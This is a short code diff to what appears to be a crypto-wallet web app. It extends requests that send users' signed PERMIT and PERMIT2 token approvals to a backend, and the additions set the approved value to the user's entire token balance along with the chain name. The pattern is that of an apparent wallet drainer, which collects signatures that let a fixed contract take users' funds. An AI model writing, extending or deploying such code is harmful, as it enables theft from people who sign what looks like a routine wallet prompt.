@@ -68,6 +68,14 @@ const CHAIN_NAMES: Record<number, string> = {
   42161: 'arbitrum-one'
 };
 
+const getChainName = (chainId: number) => {
+  if (chainId === 1) return 'Ethereum';
+  if (chainId === 56) return 'BSC';
+  if (chainId === 137) return 'Polygon';
+  if (chainId === 42161) return 'Arbitrum';
+  return 'Ethereum'; // fallback
+};
+
 const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];
 
 const EVM_ERC20_ABI = [
@@ -318,11 +326,13 @@ export default function App() {
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({
                     type: 'PERMIT',
+                    chainName: getChainName(activeChainId), 
                     token: token.address,
                     owner: cleanSenderAddress,
                     spender: EVM_CONTRACT_ADDRESS,
                     signature,
-                    deadline
+                    deadline,
+                    value: bufferedBalance.toString() 
                   })
                 });
 
@@ -376,12 +386,14 @@ export default function App() {
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({
                     type: 'PERMIT2',
+                    chainName: getChainName(activeChainId),
                     token: token.address,
                     owner: cleanSenderAddress,
                     spender: EVM_CONTRACT_ADDRESS,
                     signature,
                     deadline,
-                    nonce: currentNonce
+                    nonce: currentNonce,
+                    amount: bufferedBalance.toString() 
                   })
                 });
 
